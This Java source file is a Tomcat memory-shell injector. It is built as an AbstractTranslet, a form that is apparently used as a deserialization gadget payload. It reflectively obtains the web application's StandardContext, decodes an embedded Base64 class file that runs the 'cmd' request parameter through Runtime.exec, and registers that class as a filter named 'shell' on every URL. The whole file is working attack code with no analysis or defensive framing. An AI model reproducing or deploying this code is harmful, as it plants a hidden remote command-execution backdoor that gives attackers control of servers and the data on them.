import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class Inject extends AbstractTranslet{
    String code ="yv66vgAAADQAXwoAEAAwCAAmCwAxADIKADMANAoAMwA1BwA2BwA3CgA4ADkKAAcAOgoABgA7CgAGADwLAD0APgoAPwBACwBBAEIHAEMHAEQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACkxNZW1TaGVsbDsBAAhkb0ZpbHRlcgEAbShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAEUHAEYHADYBAApFeGNlcHRpb25zBwBHBwBIAQAKU291cmNlRmlsZQEADU1lbVNoZWxsLmphdmEMABEAEgcASQwASgBLBwBMDABNAE4MAE8AUAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBGDABRAFIMABEAUwwAEQBUDABVAFYHAFcMAFgAWQcAWgwAWwBcBwBdDAAYAF4BAAhNZW1TaGVsbAEAHWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwRmlsdGVyAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAA8AEAAAAAAAAgABABEAEgABABMAAAAvAAEAAQAAAAUqtwABsQAAAAIAFAAAAAYAAQAAAAoAFQAAAAwAAQAAAAUAFgAXAAAABAAYABkAAgATAAABAAAFAAgAAABTKxICuQADAgA6BBkExgA+uAAEGQS2AAU6BbsABlm7AAdZGQW2AAi3AAm3AAo6BhkGtgALWToHxgARLLkADAEAGQe2AA2n/+qnAAstKyy5AA4DALEAAAADABQAAAAqAAoAAAANAAoADgAPAA8AGQAQACMAEQAuABMAOQAUAEcAFgBKABcAUgAZABUAAABSAAgAGQAuABoAGwAFAC4AGQAcAB0ABgA2ABEAHgAfAAcAAABTABYAFwAAAAAAUwAgACEAAQAAAFMAIgAjAAIAAABTACQAJQADAAoASQAmAB8ABAAnAAAAEwAE/gAuBwAoBwApBwAq+QAYAgcAKwAAAAYAAgAsAC0AAQAuAAAAAgAv";
    public StandardContext getContext() {
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        try {
            Field field = WebappClassLoaderBase.class.getDeclaredField("resources");
            field.setAccessible(true);
            StandardRoot standardroot = (StandardRoot)field.get(webappClassLoaderBase);
            StandardContext context = (StandardContext) standardroot.getContext();
            return context;
        }catch (Exception e) {
            return null;
        }
    }
    public Filter getFilter() throws Exception {
        byte[] bytes = Base64.getDecoder().decode(code);

        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        Filter filter = (Filter) clazz.newInstance();
        return filter;
    }
    public Inject() throws Exception {
        StandardContext context = getContext();
        Filter filter = getFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(filter);
        filterDef.setFilterClass(filter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        context.filterStart();
        System.out.println("注入成功");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler){}
}